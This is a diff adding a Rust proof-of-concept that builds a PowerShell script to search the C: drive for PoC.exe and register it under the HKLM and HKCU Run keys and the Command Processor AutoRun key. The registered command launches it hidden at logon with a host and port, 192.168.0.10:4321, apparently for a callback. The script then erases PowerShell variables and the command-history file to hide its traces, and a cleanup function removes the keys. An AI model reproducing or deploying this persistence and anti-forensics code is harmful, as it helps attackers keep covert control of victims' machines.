@@ -1,0 +1,41 @@
+use std::process::Command;
+
+pub fn main(){
+    inj_reg("192.168.0.10", "4321")
+}
+
+fn inj_reg(host: &str, port: &str) {
+    let mut cmd: String = "$a = @(
+    \"`$nd_pth = Get-ChildItem C:`\\ -Filter PoC.exe -Recurse -ErrorAction SilentlyContinue | % { `$_.FullName }\",
+    \"`$ps_pth = (Get-Process -Id `$pid).Path\",
+    \"`$cmd = `\"`$ps_pth -windowstyle hidden -c `\" + `\"```\"`\" + `$nd_pth + `\" ".to_owned();
+    cmd.push_str(host);
+    cmd.push_str(" ");
+    cmd.push_str(port);
+    cmd.push_str(" ");
+    cmd.push_str("`\" + `\"```\"`\"\",
+    \"reg add `\"HKEY_LOCAL_MACHINE`\\Software`\\Microsoft`\\Windows`\\CurrentVersion`\\Run`\" /v PoC /t REG_SZ /d `\"`$cmd`\" /f\",
+    \"reg add `\"HKEY_CURRENT_USER`\\SOFTWARE`\\Microsoft`\\Windows`\\CurrentVersion`\\Run`\" /v PoC /t REG_SZ /d `\"`$cmd`\" /f\",
+    \"reg add `\"HKCU`\\Software`\\Microsoft`\\Command Processor`\" /v PoC /t REG_SZ /d `\"`$cmd`\" /f\",
+    \"Remove-Variable * -ErrorAction SilentlyContinue\",
+    \"Remove-Item (Get-PSReadlineOption).HistorySavePath\"
+    ); ForEach ($b in $a) {
+        iex $b      
+    }");
+    let out = Command::new(cmd).output().expect("failed to execute process");
+    println!("stdout: {}", String::from_utf8_lossy(&out.stdout));
+}
+
+fn clean_reg(){
+    let cmd: &str = "$a = @(
+        \"reg delete `\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\" /v PoC /f\",
+        \"reg delete `\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`\" /v PoC /f\",
+        \"reg delete `\"HKCU\\Software\\Microsoft\\Command Processor`\" /v PoC /f\"
+    ); ForEach ($b in $a) {
+        iex $b      
+    }";
+    let out = Command::new(cmd).output().expect("failed to execute process");
+    println!("stdout: {}", String::from_utf8_lossy(&out.stdout));
+}
+
+
